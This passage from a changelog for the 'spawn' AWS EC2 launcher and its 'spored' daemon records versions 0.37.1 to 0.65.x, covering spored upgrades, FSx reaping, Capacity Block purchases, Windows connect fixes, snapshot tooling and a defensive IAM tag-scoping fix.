  instance in place — no terminate/relaunch — and **preserves its lifecycle
  state** (#234). The TTL deadline, accumulated compute-seconds, and the
  completion / pre-stop / idle / FSx config all live in EC2 tags that the new
  spored re-reads on boot, so the death clock and compute clock continue across
  the swap rather than resetting (the TTL deadline is absolute and tag-stored, so
  an instance mid-life keeps its original termination time). Defaults to the
  latest release; pin with `--version`; a downgrade is refused without `--force`.
  The swap runs over SSM (keyless — works on private-subnet / no-public-IP GPU and
  Capacity-Block hosts), downloads the versioned, checksum-verified spored binary,
  swaps it atomically, restarts the daemon, and **health-checks** that it came
  back up on the target version — rolling back to the prior binary if not. Linux
  only for now (Windows is a follow-up).
- `spawn status` now flags when a **newer spored is available** for the instance,
  e.g. `spored upgrade available: v0.63.1 → v0.65.0 — run 'spawn upgrade-spored …'`
  (#234). Best-effort and offline-tolerant — if the latest release can't be
  fetched, status just shows the running version as before.
- spored writes its running version to the **`spawn:spored-version` tag** on boot,
  so `spawn status` / `spawn upgrade-spored` can read it without execing into the
  instance, and an upgrade can confirm the new binary took effect (#232/#234).

### Fixed
- **A graceful spored shutdown now flushes accumulated compute-seconds** before
  exiting (#234). The `spawn:compute-seconds` tag was only written on a throttled
  1–5 minute cadence, so stopping the daemon (including an in-place upgrade) could
  discard up to ~5 minutes of compute time; `spored`'s shutdown path now persists
  the current total so the next start resumes the compute clock without losing the
  tail.

## [0.65.0] - 2026-06-24

### Added
- `aws.Client.DescribeCapacityReservation` — looks up a single Capacity
  Reservation (state, type, AZ, start/end window) so a consumer can derive a
  Capacity Block's start time and confirm it's in a launchable state before
  firing. Groundwork for lagotto's Capacity-Block start-time launch (lagotto#62).

## [0.64.1] - 2026-06-24

### Security
- **Scoped spored's `ec2:CreateTags`/`ec2:DeleteTags` to already-managed instances**
  (#174). The spored IAM role previously granted `ec2:CreateTags` on `*` with no
  condition, while the destructive `TerminateInstances`/`StopInstances` were
  conditioned on `ec2:ResourceTag/spawn:managed=true` — so a compromised spore
  could tag ANY instance `spawn:managed=true` and then terminate it, defeating the
  containment. Tag writes are now conditioned on `ec2:ResourceTag/spawn:managed=true`
  too, so a spore can only (re)tag instances already in scope (it only ever tags
  its own instance, which always carries the tag). Re-applied to existing roles on
  the next launch/role refresh.

## [0.64.0] - 2026-06-24

### Added
- `spawn status` now shows the **spored version** running on the instance (#232).
  spored's `status` output gained a `spored: vX.Y.Z` line, which `spawn status`
  surfaces — so you can see at a glance whether an instance is running an older
  spored than the local spawn (useful after upgrading, or when debugging a
  lifecycle behavior that changed between versions). The version is the one baked
  into that instance's spored binary at launch.

## [0.63.1] - 2026-06-24

### Fixed
- **`launcher.Provision` no longer orphans a launched instance (and any ephemeral
  FSx) when a post-launch step fails** (#220). Previously, if `RunInstances`
  succeeded but the follow-on ephemeral-FSx setup failed, `Provision` returned an
  error *without* terminating the now-running instance — leaking a billable
  instance, and (under lagotto's per-AZ retry loop) one orphaned instance + FSx
  per AZ attempt. `Provision` now tears the instance back down on any post-launch
  failure, so a partial provision leaves nothing billable (the #193 fail-closed
  contract now extends past RunInstances). Verified live: the same scenario that
  orphaned a t3.micro now terminates it automatically.

### Added
- `launcher.ErrPostLaunch` sentinel: wraps a failure that occurred *after*
  `RunInstances` succeeded (the instance was launched and has since been torn
  down). Callers that retry across AZs/regions should treat it as terminal
  (`errors.Is(err, launcher.ErrPostLaunch)`) — the launch worked, so retrying
  can't help and only churns launch+terminate cycles (#220).

### Security
- Bumped `golang.org/x/net` to v0.55.0 in the `lambda/dns-updater` submodule
  (the main module was already current), clearing newly-published HIGH CVEs
  (CVE-2026-25680/25681/27136/33814/39821/42502/42506).

## [0.63.0] - 2026-06-21

### Added
- **Optional spot-interruption webhook** (#228) — `spawn launch
  --spot-webhook-url <url>` makes `spored` fire a single, best-effort `POST` when
  an AWS spot interruption notice arrives, so an off-node consumer learns about
  the reclamation **inside the ~2-minute warning window** (which the tag-and-poll
  surface structurally can't deliver). The JSON payload is a fixed projection of
  on-node facts (instance/region/az, the AWS `action`, the interruption deadline,
  accumulated compute-seconds, last-activity time) plus `--webhook-correlation`,
  an opaque blob echoed back verbatim so a consumer can correlate the event to
  its own record. `--webhook-timeout` (default 2s) hard-caps the POST so it can
  never eat the window. Fire-once, no retry, never awaited, fired last — a slow
  or dead endpoint cannot delay the node's survival work; the EC2 state + `spawn:*`
  tags remain the durable source of truth. Opt-in; empty URL = today's behavior.
- **`spawn launch --reconciler cohort`** (experimental, hidden) — routes
  job-array / MPI launches (`--count > 1`) through the
  [cohort](https://github.com/spore-host/cohort) reconciler instead of the
  hand-rolled goroutine loop. The cohort engine gives the all-or-nothing launch a
  real barrier, a **leak-free drain** on partial failure, and legible per-member
  failure summaries. Peer discovery stays self-organizing on-instance and there
  is no capacity fallback yet (single placement rung), so the user-visible
  outcome matches the default `legacy` engine. Default remains `legacy`; pass
  `--reconciler cohort` to opt in. Depends on
  [cohort v0.2.0](https://github.com/spore-host/cohort/releases/tag/v0.2.0).
- **`spawn resources`** — lists every AWS resource spore.host created in an
  account/region (found by the `spawn:managed` tag via the Resource Groups
  Tagging API). Defaults to resources you created; `--all` includes other
  principals; `--all-regions` sweeps every enabled region (#259).
- **`spawn cleanup`** — removes spawn-managed shared infrastructure (security
  groups, key pairs, IAM role/profile, orphaned volumes, log groups, tables) in
  dependency order. Dry-run by default; `--force` to delete. **Never removes
  running instances** — it refuses and exits if any are still running. Writes a
  log to `~/.spawn/cleanup-<timestamp>.log` (#259).
- **`spawn orphans`** — read-only report of resources that look abandoned
  (available EBS volumes; shared infra when no instances remain) (#259).
- spored fires a **`region_vacated`** notification when it terminates the last
  spawn-managed instance in a region, re-confirming after a 60s settle window to
  avoid false alarms during rapid relaunch. Notify-only by default (#260).

### Changed
- Consistent `spawn:managed` tagging on all created resources (#258): EC2 key
  pairs (tag-on-import), the bot cross-account IAM role, and the autoscaler
  DynamoDB table now carry the tags; `spawn:created-at` is the canonical
  creation-timestamp tag across resource types.

### Fixed
- Fixed a data race on the spored agent's config (#175). The monitor loop
  periodically replaces `Agent.config` (tag refresh) while the FSx-mount and
  spot-monitor goroutines read it; access now goes through a mutex-guarded
  snapshot (`cfg()`/`setConfig()`), and the agent tests run under `-race`. Also
  removed a redundant, racy write of the EBS hourly cost from a startup goroutine
  (the value already propagates via the instance tag + the periodic refresh).

### Changed
- Removed a byte-identical duplicated zombie-prevention block in `launch` that
  emitted the `--no-timeout` warning twice (#175).
- `configRefreshTick` is now a per-Agent field instead of a package global (#175).

### Documentation
- Reworked the Nextflow examples (`examples/workflows/nextflow/`,
  `examples/genomics-nextflow/nf-core-sarek/`) to use the current **nf-spawn**
  executor plugin instead of the obsolete "run Nextflow inside one spawned box"
  pattern.
- Marked the WDL and CWL examples as **work in progress** — Nextflow (via
  nf-spawn) is the only first-class workflow integration today.
- Removed the `examples/genomics/` BAMS3 example (depended on the external
  `aws-direct-s3` project).
- Fixed dead doc links across `examples/` (the missing `WORKFLOW_INTEGRATION.md`
  and `docs/how-to/genomics-workflows.md`) and the stale `scttfrdmn/spore-host`
  URL in `scripts/spored.service`.
- README command table: `cancel` is correctly described as cancelling a
  parameter sweep (not terminating an instance), and the missing `terminate`
  command was added.

## [0.62.0] - 2026-06-17

### Added
- **`spawn launch` can target a Capacity Reservation or Capacity Block for ML**
  (#216): `--reservation-id <id>` launches into an existing reservation
  (`RunInstances` `CapacityReservationSpecification`), and `--capacity-block`
  marks it as a Capacity Block consume (`MarketType=capacity-block`). The
  reservation id also flows from truffle input (`reservation_id`), which was
  previously parsed but silently dropped. `--capacity-block` requires
  `--reservation-id` and is mutually exclusive with `--spot`. The instance must be
  in the reservation's AZ — pin `--az` to match. (Pairs with `truffle
  capacity-blocks` discovery and `spawn capacity-block purchase`.)
- **`spawn capacity-block purchase <offering-id>`** — reserve a Capacity Block for
  ML (#217). This is a **non-refundable up-front charge** (the most expensive
  action spawn can take), so it is heavily gated: it re-validates the offering and
  its price, then requires you to **type three confirmations** — the exact price,
  `purchase <offering-id>`, and `I UNDERSTAND THIS IS NON-REFUNDABLE` — and
  **refuses to run on a non-interactive terminal** (no `--yes` bypass). `--dry-run`
  previews the price and terms without buying anything (no write API call). The
  price is re-checked immediately before charging and the purchase aborts if it
  moved. On success it prints the reservation id and the `spawn launch
  --reservation-id … --capacity-block` command to use. Purchases are audit-logged.

### CI
- Pin govulncheck to v1.3.0; v1.4.0 panics analyzing generics
  (`ForEachElement called on type containing *types.TypeParam`), crashing the
  scan rather than reporting a real vulnerability.

## [0.61.0] - 2026-06-17

### Changed
- **Ephemeral `--fsx-create` now creates the filesystem AFTER the instance
  launches, not before** (#213). Previously the FSx was created up front and, on a
  launch failure, torn down again (the #210 fix) — which under lagotto's
  per-AZ/per-poll capacity-retry loop meant a create→fail→delete cycle on every
  attempt. Now `RunInstances` runs first; only on success is the FSx created and
  the instance tagged `spawn:fsx-pending` (spored then mounts it once AVAILABLE,
  unchanged). A capacity-failed launch issues **zero** `CreateFileSystem` calls —
  no orphan, no churn — by construction. The fail-closed lifecycle validation
  still runs up front (a bad config fails fast without launching), and the
  compensating teardown is retained as a backstop for the narrow window where the
  FSx is created but tagging the instance fails. No user-visible latency change
  (spored already mounts asynchronously). Job arrays (`--count > 1`) keep creating
  the shared FSx before dispatch. Applies to both the CLI and the headless
  launcher (`launcher.Provision`).

## [0.60.0] - 2026-06-17

### Fixed
- **CRITICAL: a failed `--fsx-create` launch no longer orphans the ephemeral FSx
  filesystem** (#210). The ephemeral FSx is created *before* `RunInstances`; if
  the launch failed (e.g. `InsufficientInstanceCapacity`), the filesystem had no
  instance to own it and the ttl-reaper — which keyed ephemeral reclamation on
  instance *termination* — never reclaimed it. Under lagotto's retry-on-capacity
  loop this orphaned ~3 × 1.2 TiB filesystems per poll, exhausting the account's
  PERSISTENT_2 quota in ~35 min (~$14.6k/mo if left running). Two layers of
  defense now: (1) **compensating teardown** — both the CLI and the headless
  launcher (`launcher.Provision`) delete the just-created ephemeral FSx if the
  launch fails, so a capacity failure leaves no billable resource (the #193
  fail-closed contract); and (2) **reaper safety net** — the ttl-reaper now
  reclaims any `spawn:fsx-lifecycle=ephemeral` filesystem that has had no
  referencing instance (neither `spawn:fsx-id` nor `spawn:fsx-pending`) for longer
  than a 30-minute orphan grace, covering the "instance never launched" case even
  if the teardown itself is missed (crash, delete error). The refcount check now
  also counts the `spawn:fsx-pending` provisioning lease, so a healthy FSx is
  never reaped during its ~10-minute mount window.

## [0.59.0] - 2026-06-16

### Fixed
- **`spawn launch --fsx-create` now honors `--az` when placing the filesystem**
  (#208). `--az` was applied to the EC2 instance but never to the FSx create,
  which fell back to `subnets[0]` of the default VPC regardless of `--az`. Two
  consequences: (1) the FSx could land in a different AZ than the instance — an
  **unmountable cross-AZ FSx** (FSx Lustre is single-AZ); and (2) on accounts
  whose `subnets[0]` AZ doesn't offer PERSISTENT_2, **every** `--az` value failed
  identically with `The requested Lustre configuration: PERSISTENT_2 is not
  available in this availability zone` — a per-AZ-availability illusion that was
  really the same wrong subnet each time. spawn now resolves the pinned AZ to a
  default-VPC subnet (`GetSubnetForAZ`) so the filesystem co-locates with the
  instance. Applies to both the CLI and the headless launcher
  (`launcher.Provision`). An explicit pinned subnet still wins; with no AZ and no
  subnet, the default-VPC fallback (matching the instance's own placement) is
  unchanged.

## [0.58.0] - 2026-06-16

### Fixed
- **Windows `spawn connect` / `--rdp` now obtains the Administrator password over
  SSM** instead of depending on EC2's `GetPasswordData` (#201). EC2Launch's
  `setAdminAccount` generates the retrievable password only on the first boot
  after a Sysprep, then disables it — so an instance launched from a **warm AMI**
  (re-imaged, never re-Sysprepped — #98) never produced a retrievable password and
  `connect --rdp` timed out (`password data not available within 12m0s`). spawn now
  owns the credential: when the SSM agent is Online it generates a strong random
  password and sets it directly (`Set-LocalUser` over SSM RunCommand), working
  uniformly on warm and base AMIs and keeping the warm AMI fast. It falls back to
  the previous `GetPasswordData` + RSA-decrypt path when SSM is unreachable (a base
  AMI with no instance profile). Needs `ssm:SendCommand` on the connecting
  principal — the same dependency `spawn connect` already has on Windows.

## [0.57.0] - 2026-06-16

### Added
- The headless launcher (`launcher.Provision`, used by lagotto and SDK consumers)
  now supports **ephemeral async FSx create** (#202) — previously FSx-create was
  wired only in the CLI, so a headless caller's FSx fields were silently ignored.
  `Provision` fires `CreateFileSystem` async, tags `spawn:fsx-pending`, and
  returns fast; spored waits → DRA → mounts (#194). Enforces the #193 fail-closed
  lifecycle contract: only `ephemeral` is valid headlessly (durable is a
  deliberate up-front `spawn fsx create`, not a poller action); a create with no
  bucket or a non-ephemeral lifecycle errors.

## [0.56.0] - 2026-06-16

### Added
- **Ephemeral FSx is created asynchronously, with no blocking wait** (#194).
  `spawn launch --fsx-create --fsx-lifecycle ephemeral` now fires
  `CreateFileSystem` and returns in seconds, tagging the instance
  `spawn:fsx-pending`; **spored** then waits (off the lifecycle critical path)
  for the filesystem to become AVAILABLE, sets up the continuous S3 export
  association, mounts it (Lustre, Linux), and flips the tag to `spawn:fsx-id` so
  the reaper's refcount (#192) sees a live user. The FSx is reaped when the
  instance terminates. Because neither the CLI nor a headless caller blocks on
  the ~10-minute provisioning, this is the path the lagotto capacity-poller uses.
  Best-effort throughout: a failed/slow mount or export-association never
  terminates the instance or gates TTL/idle enforcement. (`durable` FSx stays a
  blocking, up-front create.)
- **`spawn launch --fsx-create` now requires an explicit `--fsx-lifecycle`**
  (`ephemeral` or `durable`), fail-closed (#193). An FSx Lustre filesystem is
  expensive and holds the only copy of results, so its lifetime is never inferred
  or defaulted: a create with no lifecycle is rejected, and `durable` requires
  `--fsx-ttl` (no death-clock-less filesystem can exist). `ephemeral` is reaped
  with the instance (refcount, #192); `durable` carries a `spawn:ttl-deadline`
  tag. New canonical guide: `docs/durable-storage-fsx.md` (leads with the
  lifetime decision + the cost of each).
- The ttl-reaper now reclaims orphaned spawn-managed **FSx Lustre filesystems**
  (#192) — the cost backstop that gates any FSx auto-create feature. An FSx is
  reaped only when it is past its `spawn:ttl-deadline` (or, lacking one, older
  than the max-age ceiling) **and** has **no live instance** still using it
  (refcount via the `spawn:fsx-id` tag already written at launch — a single live
  user blocks the reap). Deletion does not skip the final export, so an attached
  S3-export DRA flushes remaining data on delete rather than dropping it (#184).
  Honors `REAPER_DRY_RUN` / `REAPER_NOTIFY_URL` like instance reaps. Filesystems
  still creating/deleting are never touched.

### Changed
- FSx deletion is now a shared `Client.DeleteFSxFilesystem` (`pkg/aws/fsx.go`)
  used by both `spawn fsx delete` and the reaper; it omits `SkipFinalExport` so
  the export DRA flushes to S3 on delete.

## [0.55.0] - 2026-06-16

### Added
- The ttl-reaper backstop can now run a doomed instance's `--pre-stop` hook via
  SSM **before** the hard terminate (opt-in `REAPER_GRACEFUL=true`, #187).
  Previously the out-of-band reaper called `TerminateInstances` directly, so when
  spored was dead/wedged and never ran pre-stop, the user's flush was skipped
  entirely. The reaper now (when enabled) runs the hook on a running, SSM-managed
  instance as `spawn:local-username` (per #63), bounded by
  `REAPER_GRACEFUL_MAX_WAIT` (default 2m), then terminates **regardless** of the
  outcome — strictly best-effort, never weakening the hard-deadline guarantee.
- A failed or timed-out `--pre-stop` hook now emits a loud lifecycle
  notification (`pre_stop_failed` / `pre_stop_timeout`) instead of looking
  identical to success (#186). spored captures a tail of the hook's output and
  includes it (e.g. an `aws s3 sync` credentials error), and broadcasts a
  terminal warning to logged-in users. Pre-stop is still best-effort and never
  blocks the lifecycle action — but a silent partial/no-op flush (the #184
  data-loss shape) is no longer mistaken for a clean save. Formatting for the new
  events ships in the spore-bot Slack/Teams/Discord/SMS notifier.

## [0.54.0] - 2026-06-16

### Fixed
- `--pre-stop` now runs as the instance's primary user (e.g. `ec2-user`), not
  root (#63). spored is a root service, so the hook's `~`/`$HOME` previously
  resolved to `/root` — a hook like `aws s3 sync ~/output s3://…` silently synced
  the empty `/root/output` instead of the workload's real output and "succeeded"
  copying nothing, losing data on ephemeral storage. The launcher now tags
  `spawn:local-username` and spored runs the hook via `su - <user> -c` (login
  shell, matching how the workload ran); the username is validated before use,
  and an absent tag (older instances) falls back to the previous root shell.
  Windows is unaffected (single user, no `su`).

## [0.53.0] - 2026-06-15

### Changed
- Bumped the `substrate` test dependency to v0.71.0, which models the SSM
  dead-state (a running instance with no IAM instance profile is not listed by
  `DescribeInstanceInformation`, and `DescribeInstances` echoes the profile —
  substrate#331). Re-enabled the end-to-end `WaitForSSMOnline` dead-path test
  (`ErrSSMUnreachable` fires fast for a no-profile instance) that had to be
  unit-only while substrate couldn't represent it.

### Fixed
- `spawn image import` warm-AMI build no longer fails after a 30-minute SSM
  timeout. The warm seed was launched **without an IAM instance profile**, so
  the SSM agent could never register (`PingStatus=Online`) — the warm stage
  waited out the full timeout on a structurally impossible condition. The seed
  now launches with the spored instance profile (which includes
  `AmazonSSMManagedInstanceCore`), and `WaitForSSMOnline` distinguishes **dead**
  from **slow**: if an instance has no profile it fails fast with a clear cause
  instead of waiting out the timeout, and a long-but-live wait prints a periodic
  heartbeat so it doesn't look hung (#98).
- `spawn extend` no longer risks setting a TTL deadline in the past. The new
  `spawn:ttl-deadline` is floored at `now + requested-duration`, so an
  already-expired deadline (or a stale launch anchor) can't terminate the
  instance the moment you ask to extend it (spore-host#374).
- `spawn snapshot create` (from a directory or tar) now builds the ext4
  filesystem with `lost+found` at mode `0755` instead of the writer's default
  root-only `0700`. A tool that walks a volume-mounted snapshot (e.g.
  MetaPhlAn's `find -L <db>`) no longer emits a spurious
  `find: '<db>/lost+found': Permission denied` to stderr (#177, nf-spawn#55).

### Security
- Semgrep SAST is now **enforcing** in CI (`--config=auto --error`) instead of
  report-only (#368). Triaged the existing findings: two `exec.Command` call
  sites (the RDP-client launcher in `cmd/connect.go` and the e2e test runner) and
  a test's ephemeral-port `net.Listen` are annotated inline as false positives
  with `# nosemgrep: <rule-id> -- <reason>`; illustrative `examples/` are excluded
  via `.semgrepignore` (they shell out / template parameters by design and aren't
  shipped). No product-code findings remain.

## [0.52.0] - 2026-06-14

### Added
- Discord lifecycle notifications (Phase 1 of #2). `spawn launch --notify-platform
  discord` (also `slack`/`teams`) routes a spore's lifecycle events to Discord;
  spored carries the choice via a new `spawn:notify-platform` tag (default
  `slack`, so existing launches are unchanged). `spawn notify workspace-add
  --platform discord --webhook-url … [--public-key …]` registers a Discord
  server: Discord verifies with an Ed25519 public key, not a signing secret, so
  `--signing-secret` isn't required for `discord` (a `--public-key` is, when you
  later enable slash commands). The spore-bot service posts color-coded embeds to
  the channel webhook. Discord slash commands are Phase 2.

## [0.51.1] - 2026-06-14

### Fixed
- `--attach-volume` (and `--efs-id`/`--fsx-id`) storage is now mounted **before**
  the `--user-data`/`--command` script runs, not after it. The mount script was
  appended to the end of user-data, so a workload launched by user-data (e.g. an
  nf-core pipeline that validates its DB mount paths exist) ran against
  **unmounted** paths and failed; the volumes only mounted once the script had
  already finished. The storage mount is now injected ahead of the user script in
  the bootstrap, so the workload sees the volumes live. Fixes both the head node
  and the per-task path on which nf-spawn's `ext.volumes` zero-copy DB workflow
  depends (#166).

## [0.51.0] - 2026-06-14

### Added
- `spawn snapshot mount <snapshot-id> <mount-point>` creates a volume from a
  snapshot, attaches it to the EC2 instance the command runs on, and mounts it
  (read-only by default) — the one-command equivalent of `create-volume` +
  `attach-volume` + `mount`. Intended for the head node of the reference-data
  workflow (so an nf-core pipeline's head-side `db_path` validation finds the DB);
  tasks already auto-mount via `--attach-volume`. Only works on an EC2 instance
  (identifies itself via IMDS) (#161 follow-up).

## [0.50.0] - 2026-06-13

### Added
- `spawn snapshot create --tag key=value` (repeatable) sets custom provenance
  tags on the snapshot at creation, merged with the `spawn:*` baseline (which it
  can't override) — no more post-hoc `aws ec2 create-tags` (#161).
- `spawn launch --tag key=value` (repeatable) tags the instance and its created
  volumes, so ephemeral spores and their `--attach-volume` data volumes are
  attributable in Cost Explorer / cleanup scripts. The `spawn:` prefix is
  reserved (#161).
- `--attach-volume` now propagates the source snapshot's **custom** tags onto the
  volume created from it (skipping the snapshot's `Name` / `spawn:*` baseline),
  plus `spawn:from-snapshot=<snap-id>`, so an attached volume is traceable back
  to its source DB (#161).

## [0.49.0] - 2026-06-13

### Fixed
- `spawn snapshot create` no longer holds the whole image in memory — it
  previously split the entire (e.g. 16 GB) image into blocks in RAM before
  uploading, so a large build's memory grew to the image size. It now streams the
  image block-by-block straight into the upload; peak memory is a small bounded
  buffer regardless of image size (#157).

### Added
- `spawn snapshot create --temp-dir <dir>` sets where the temporary ext4 image
  (built from a directory/tarball source) is staged, so a large image can use a
  roomier disk than the system temp dir (#157).

### Changed
- `spawn snapshot create` uploads snapshot blocks concurrently (bounded pool)
  instead of one at a time, filling the uplink and reducing wall-clock on large
  images (#157). For a large image over a slow connection, the command help and
  guide now recommend building from AWS CloudShell or an in-region instance so the
  upload is AWS-internal.

### Documentation
- Added a **Reference data volumes** guide (`docs/reference-data-volumes.md`)
  covering `snapshot create` (dir/tarball/raw → EBS snapshot, no instance) →
  `launch --attach-volume`, including the nf-spawn `ext.volumes` path. Added the
  `snapshot` command to the README command table and linked the guide.
- Documented the **local scratch-space** requirement for `snapshot create` from a
  directory or tarball (the ext4 image is staged to a temp file ~the uncompressed
  data size; a raw image streams with no scratch) — in both the command help and
  the guide.
- Noted in the Windows beta guide that the warm-AMI build waits for SSM on the
  build instance (used to re-arm the Administrator password) and is bounded by
  `--warm-timeout`.

## [0.48.1] - 2026-06-13

### Fixed
- Instances launched from a `spawn image import` **warm AMI** can now retrieve
  their Administrator password again (`spawn connect --rdp` and the EC2 console's
  "Get Windows password"). The warm-AMI build imaged the seed after EC2Launch had
  already generated its one-time password, so every launch from the warm AMI
  returned "Password is not available. The instance was launched from a custom
  AMI…". The build now re-arms EC2Launch (`reset -c`) over SSM before imaging — so
  a fresh password is generated on each launch — and captures the image with
  `NoReboot` so the re-armed state is preserved. This keeps the warm AMI
  non-generalized (no Sysprep). The warm build now requires the seed's SSM agent
  to come Online (it was best-effort) and fails loudly otherwise (#153).

### Added
- `spawn snapshot create --from` now accepts a **directory** or a
  **`.tar`/`.tar.gz`/`.tgz` archive**, not just a raw image — the contents are
  packed into an ext4 filesystem image in-process and streamed into the
  snapshot. This is pure Go (no `mkfs`, no builder instance), so it stays
  instance-free and works identically from macOS, Linux, and Windows hosts. The
  ext4 filesystem is sized to the data and capped at `--size`. A raw disk image
  is still streamed verbatim as before (#147 Part B / fs-builder).

## [0.47.0] - 2026-06-13

### Added
- `spawn snapshot create --from <raw-image> --size <GiB>` builds an EBS snapshot
  directly from a raw disk/filesystem image using the EBS direct APIs — **no EC2
  instance and no attached volume**. The image source is a local path or an
  `s3://bucket/key` URI; all-zero blocks are skipped (sparse upload). Pair it
  with `--attach-volume` to get large reference data (a Kraken2 DB, BLAST index,
  ML weights) onto spores without baking a custom AMI. The `--from` input must be
  a raw block image, not an archive — building a filesystem image from a
  directory/tarball for you is a planned follow-up (#147 Part A).

## [0.46.0] - 2026-06-13

### Added
- `spawn launch --attach-volume snap-xxx:/mount/point[:ro|:rw]` attaches an
  additional EBS data volume created from a snapshot, mounted at the given path
  (read-only by default for shared reference data). Repeatable for multiple
  volumes. The volume is created at launch with `DeleteOnTermination=true`, so it
  dies with the ephemeral instance; the snapshot persists and is reused. This
  lets large reference data (e.g. a Kraken2 database) live in a re-snapshottable
  volume on a stock AMI instead of being baked into a custom AMI — root volumes
  stay small, and a data update is a re-snapshot, not an AMI rebuild. Mounts are
  NVMe-aware (the requested `/dev/sdf` is resolved to the live device on Nitro)
  and snapshot-backed volumes are never reformatted (#144).

## [0.45.1] - 2026-06-12

### Fixed
- `--estimate-only` now runs the same instance-type constraint validation
  (EFA / hibernation / MPI / placement-group, #110) a real launch does, before
  the cost estimate — so it's a true dry-run. Previously it printed a cost
  estimate even for a config that couldn't launch (e.g. `--efa` on a non-EFA
  type), making it useless for validating a config without spending (#124).
- `make build` / `make build-spored` now build the spored **package**
  (`./cmd/spored/`) instead of `cmd/spored/main.go` alone, which failed on
  symbols defined in spored's platform-split sibling files (`undefined:
  runAsServiceIfManaged`, …). All Makefile build targets now build packages, not
  single files (#141).

### Testing
- CI now builds, vets, and tests each `lambda/*` module. They're separate Go
  modules, so the root `go test ./...` never descended into them — their tests
  (incl. the dns-updater Substrate Route53 test) never ran in CI, and their code
  was invisible to coverage (#136). This immediately surfaced stale go.mod/go.sum
  in `sweep-orchestrator`, `ttl-reaper`, `alert-handler`, and
  `autoscale-orchestrator` (would fail `go build` without `-mod=mod`); fixed via
  `go mod tidy`.

## [0.45.0] - 2026-06-12

### Added
- Friendly account-name DNS: instances are tagged with `spawn:account-name` — a
  DNS-safe slug of the AWS account's friendly name (from `aws account
  put-account-name`) — and the dns-updater registers a CNAME
  `{name}.{account-name}.spore.host` → the canonical base36 A-record, so the
  legible FQDN resolves. base36 stays authoritative (holds the IP); the name is a
  true alias. Best-effort end to end: when the account has no name, the caller
  lacks `account:GetAccountInformation`, or the slug isn't a valid DNS label, it
  silently falls back to base36-only (unchanged). Spans the launch tag (#121),
  spored's DNS registration, and the dns-updater Lambda (spore-host#357). The
  CNAME upsert/delete is covered by a Substrate-emulator Route53 test.

### Testing
- Add a **Tier 2** e2e test (`-tags=e2e_tier2`) exercising `launcher.Provision`
  against real AWS — a keyless/SSM-only launch, the headless path lagotto takes.
  Substrate (Tier 0) accepts malformed user-data and an empty KeyName, so it
  missed both #127 and #130; only a real `RunInstances` catches that class. Uses
  the existing tier cleanup (terminate-by-name + reaper + TTL).

## [0.44.2] - 2026-06-12

### Fixed
- `client.Launch` omits `KeyName` from `RunInstances` when no key pair is set,
  instead of sending an empty string. EC2 rejects `KeyName: ""` with "Invalid
  value '' for keyPairNames"; omitting the field is the supported way to launch
  with no key pair — the SSM-only headless path (lagotto `--action spawn`). Second
  blocker, after #127, on the lagotto#19 watch→launch→run flow (#130).

## [0.44.1] - 2026-06-12

### Fixed
- `launcher.Provision` now base64-encodes (gzip+base64) the bootstrap before
  setting `LaunchConfig.UserData`. It was assigning the raw script, so every
  headless launch (lagotto `--action spawn`) failed at `RunInstances` with
  "Invalid BASE64 encoding of user data" — blocking the entire lagotto#19
  watch→launch→run flow on its first real launch (#127).

## [0.44.0] - 2026-06-12

### Added
- `spawn version` now reports whether a newer release is available (an explicit,
  on-demand check), instead of only surfacing updates incidentally on other
  commands (#117).

### Documentation
- Windows beta guide: bump the version floor to v0.43.0 (where `--ssh` shipped),
  so following the guide's SSH steps can't fail with "unknown flag" on v0.42.0.

## [0.43.0] - 2026-06-12

### Added
- `spawn connect <name> --ssh` for Windows: SSH straight to the instance as
  Administrator (PowerShell shell), the same path as Linux — no SSM, no Session
  Manager plugin.

### Fixed
- Windows bootstrap now opens inbound TCP 22 for **all** firewall profiles. The
  OpenSSH feature only adds a Private-profile rule, but an EC2 instance's network
  is classified Public, so SSH to the public IP was blocked (RDP worked, SSH did
  not) until this rule. Found and verified via a live smoke test.
- Launch success hint for Windows lists the three real connect paths (`--rdp`,
  `--ssh`, PowerShell-over-SSM) instead of the misleading "SSH-over-SSM".

### Documentation
- Rewrote the Windows beta guide for accuracy (pre-warmed AMI build, `aws login`,
  optional SSM plugin, `--ssh`) and for flow (defines terms before using them).
- README: corrected the Go library example (`launcher.Provision`, not the
  nonexistent `client.LaunchInstance`); documented Windows connect paths and the
  `image`/`ami` commands.

## [0.42.0] - 2026-06-11

### Added
- `spawn connect` injects spawn's managed SSH key over SSM when it doesn't hold
  the instance's launch key, so keyless instances (e.g. those launched headlessly
  by lagotto) are still reachable; falls back to a Session Manager shell when
  injection isn't possible.

### Fixed
- Regression guard: `--on-complete` fires regardless of how the job was started
  (the root cause of the original report was fixed in 0.36.12; this pins it).

## [0.41.0] - 2026-06-11

### Added
- `pkg/launcher`: exported, headless `Provision` + `BuildLinuxBootstrap` so SDK
  consumers (lagotto, cohort) provision a fully-functional spore — with the
  spored bootstrap, AMI auto-detection, and IAM setup — instead of a bare
  instance. The `spawn launch` CLI now shares this code path.

### Fixed
- FSx: a cross-region S3 backing bucket (which answers HeadBucket with a 301
  redirect) is treated as existing rather than erroring (#103).
- `--mpi` on HPC instance types (hpc6a/hpc7a/…) no longer fails on placement
  groups — those families use AWS HPC networking and are skipped gracefully;
  instance-type capabilities are sourced from truffle (#104).
- Pre-flight validation of EFA / hibernation / MPI support before any AWS
  resources are created, with actionable errors (#110).
- `RunInstances` accepts an optional idempotency token and surfaces classifiable
  AWS error codes (#108).

## [0.40.0] - 2026-06-11

### Added
- Windows: bake a warm/fast-boot AMI into the `spawn image import` flow by
  default — a one-time seed instance runs Windows' first-boot setup, is imaged,
  and is terminated, so later launches are ready in ~4 minutes instead of ~30.
- `spawn connect --rdp` (and `--rdp --via-ssm`) for Windows Remote Desktop.

## [0.39.0] - 2026-06-09

### Added
- `spawn image import` — turn a Windows ISO into an AMI via EC2 Image Builder (#83).
- `--nested-virtualization` launch flag with instance-type validation (#91).

## [0.38.1] - 2026-06-08

### Fixed
- Windows `spored` bootstrap: install the AWS CLI before pulling spored from S3
  (the stock Windows AMI has none), and attach `AmazonSSMManagedInstanceCore` to
  the spored instance role so Windows connect over SSM works (#77).

## [0.38.0] - 2026-06-08

### Added
- `spored` on Windows: idle/metrics detection (PowerShell/quser), runs as a
  native Windows Service, shipped via S3 and installed at launch (#77).

## [0.37.3] - 2026-06-07

### Added
- Target-OS-aware launch + initial Windows connect (RDP info + SSM PowerShell),
  Phase 1 of Windows support (#55).

## [0.37.2] - 2026-06-07

### Fixed
- Retry `DescribeInstances` on the post-`RunInstances` NotFound window (#78).

## [0.37.1] - 2026-06-07

### Changed
